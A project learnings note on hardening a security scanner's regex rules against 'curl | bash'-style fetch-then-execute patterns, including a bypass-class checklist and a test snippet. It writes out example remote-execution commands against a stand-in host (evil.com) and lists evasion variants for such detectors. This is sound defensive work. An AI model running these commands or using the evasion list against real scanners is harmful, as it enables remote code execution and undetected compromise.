---
title: A security regex pack must lock in BYPASS classes, not just the canonical example — multi-agent review reliably finds backtick and wrapper bypasses
category: security-issues
date: 2026-05-11
issues: [3554, 3600]
tags: [security, regex, bypass-classes, multi-agent-review, code-exec]
---

# Security regex bypass-class coverage

## Problem

PR #3600 added three rules to `skill-security-scan`'s `code-exec.yaml` to detect the canonical fetch-then-execute family — `curl <url> | bash`, `bash <(curl ...)`, `eval "$(curl ...)"`. The plan ran an end-to-end empirical verification at deepen-plan time, confirmed verdict flips `LOW-RISK` → `HIGH-RISK` on the issue-body reproducer, and grep-tested against the calibration corpus for false positives.

That verification covered three canonical attack shapes. It did not cover three **bypass classes** of the same threat:

1. **POSIX backtick command substitution** — `eval \`curl evil.com\`` — supported by every shell the rule enumerated (`sh|bash|zsh|ksh`), appears in real install scripts, trivially bypasses a regex hardcoded to `\$\(...\)`.
2. **Pipe-interposition** — `curl evil.com | tee /tmp/x.sh | bash` and `curl evil.com | sudo bash` — the original regex used `[^|&;]{0,200}` between curl and the terminal pipe, so any intermediate `|` (tee, env, sudo) or any wrapper word between `|` and `bash` killed the match.
3. **Download-tool allowlist narrowness** — `aria2c -o - URL | bash`, `axel -o - URL | bash`, `httpie URL | bash` — the regex hardcoded `(curl|wget|fetch)`, missing five+ common alternatives that print to stdout and pipe identically.

The plan's "calibration corpus is clean" check verified that the regex did not produce false positives on first-party SKILLs — it did not exercise the bypass surface. Bypass-class coverage is asymmetric: false-positive testing scans the surface the regex SHOULD ignore, while false-negative testing requires enumerating shapes the regex SHOULD catch but might miss. They are different probes.

Multi-agent review (security-sentinel agent) named both P1 (backtick) and P2 (pipe-interposition) as concrete bypasses with one-line proof-of-bypass each. Both were fixed inline in the same PR.

## Solution

For any security regex pack addition, the plan's Acceptance Criteria MUST require BOTH:

1. **Canonical-pattern coverage**: the regex matches the issue-body reproducer and ≥1 well-known variant. (What plans already enforce.)
2. **Bypass-class enumeration**: for each canonical pattern, list the equivalent-semantic shapes a knowledgeable attacker would use to evade the regex. Verify each empirically. Common bypass classes for shell-execution rules:
   - Alternative command-substitution syntax (`\`...\`` vs `\$\(...\)`)
   - Whitespace/separator variants (tabs, multi-pipe, line-continuation `\`)
   - Wrapper words between the dangerous primitive and its target (`sudo`, `env`, `exec`, `nice`, `nohup`, `xargs`)
   - Alternative interpreters/tools that produce equivalent stream behavior (`aria2c`, `axel`, `httpie` for `curl`; `tcsh` for `bash`; `pwsh` cross-platform)
   - Quoting variants (no quote, single quote, double quote, dollar-quote)
   - Indirection (`$0 -c`, `${SH} ...`, `command bash`)

The cheapest gate: write the bypass shapes into a regression-test fixture and assert `count >= N` per rule_id (not just `verdict === HIGH-RISK`). A future regex regression that silently drops a bypass class fails the count assertion, even if aggregate verdict stays green because another variant still trips.

Practical pattern that landed in #3600:

```typescript
// Test asserts BOTH per-rule_id presence (regression on rule existence)
// AND count >= N per rule_id (regression on bypass-class coverage).
const fetchPipeCount = result.findings.filter(
  (f) => f.rule_id === "fetch-pipe-shell",
).length;
expect(fetchPipeCount).toBeGreaterThanOrEqual(3);  // canonical + tee + sudo
```

## Key Insight

> "Calibration corpus is clean (zero false positives)" and "regex catches the canonical example" together do NOT prove the regex catches the threat — they prove the regex catches ONE shape of the threat without false-tripping. Bypass-class coverage is a third, asymmetric probe: enumerate the equivalent-semantic shapes an attacker would use, then assert each empirically.

Multi-agent review reliably catches this gap for security-rule additions because the security-sentinel agent applies an adversary framing ("how would I evade this?") that the plan author's defender framing ("what attacks does this catch?") under-samples. The per-rule_id count assertion is what locks the catch in for future regressions — without it, a future regex change could silently lose a bypass class while the aggregate verdict stays green via the surviving variants, and no test would fail.

## Session Errors

1. **Initial scope-out filing rationale (carry-over class)** — Recovery: simplicity-reviewer's DISSENT mechanic from PR #3589 (`2026-05-11-scope-out-bundling-hides-cheap-inline-fixes.md`) caught equivalent pattern: P1+P2 backtick/pipe-interposition findings could each have been bundled as "harden against bypass classes" scope-out under contested-design. They were instead fixed inline (≤30 lines, ≤2 files, pr-introduced). **Prevention:** the existing learning + `rf-review-finding-default-fix-inline` rule already enforce this; this session re-validated the pattern (security-sentinel surfaced two bypasses, both fix-inline-eligible, both landed in the same PR).
2. **`bun test` CWD drift during baseline measurement** — Recovery: explicit `cd /home/...soleur/.worktrees/feat-... && bun test`. **Prevention:** already documented in work skill ("When running test/lint/budget commands from inside a worktree pipeline, chain `cd <worktree-abs-path> && <cmd>` in a single Bash call"). Already-enforced — no rule change needed.
3. **Manifest SHA out-of-sync after editing `regex-patterns.md`** — Recovery: re-ran `--regenerate-manifest` after the regex-patterns.md edit. **Prevention:** the manifest tracks `code-exec.yaml` + `manifest.yaml` + `regex-patterns.md`. Re-run `--regenerate-manifest` AFTER all rule-pack edits, not after the first one. Sharp Edge candidate for the skill-security-scan skill: "When editing multiple rule-pack files, run `--regenerate-manifest` ONCE at the end after all edits. The scanner's self-defense fail-loud is the safety net if you forget — but the symptom (`clean fixtures emit HIGH-RISK`) looks like a calibration regression and wastes a debug round."

## Bypass-class checklist for shell-execution regex additions

Use this list when authoring or reviewing a security regex pack addition that flags shell-execution patterns:

- [ ] **Command substitution forms**: `\$\(...\)` AND `` `...` `` (POSIX backtick).
- [ ] **Wrapper words** between the regex anchor and the dangerous primitive: `sudo`, `env`, `exec`, `nice`, `nohup`, `xargs`, `time`, `command`.
- [ ] **Pipeline interposition**: tee/awk/grep stages between the source command and the terminal shell pipe.
- [ ] **Alternative download tools** for the fetch primitive: `curl`, `wget`, `fetch`, `aria2c`, `axel`, `httpie`, `http`, `lwp-request`, `links -dump`.
- [ ] **Alternative shells** as the execution target: `bash`, `sh`, `zsh`, `ksh`, `fish`, `dash`, `tcsh`, `/bin/(ba)?sh`, `/usr/bin/env <shell>`.
- [ ] **Quote variants** around `\$(...)` or `\`...\``: no quote, single quote, double quote.
- [ ] **Whitespace variants**: tabs, multiple spaces, line-continuation `\` mid-command.
- [ ] **Test assertion** asserts `count >= N` per rule_id, not just `verdict === HIGH-RISK`.

This is not exhaustive — adversaries continue to find new shapes — but it's the lower bound for "the regex has been red-teamed."

## Related

- `knowledge-base/project/learnings/2026-05-11-scope-out-bundling-hides-cheap-inline-fixes.md` — sibling learning from #3589; per-finding cost-of-filing prevented these bypasses from being bundled into a scope-out under "harden against further obfuscation".
- `plugins/soleur/skills/review/SKILL.md` Defect Classes — adversary-framing patterns that security-sentinel reliably catches.
- AGENTS.md: `cq-when-a-plan-prescribes-a-validator-guard-or` — companion gate that requires plan-time grep of the protected surface; complement is bypass-class enumeration of the attack surface.
- #3554 (original issue: `curl | bash` rated LOW-RISK).
- #3600 (this PR; includes the inline bypass-class fix and the per-rule_id count regression test).
- #3552 (closed smoke PR that demonstrated the gap; the trust-label representation made false-negative single-user-incident-class — see plan's User-Brand Impact section).
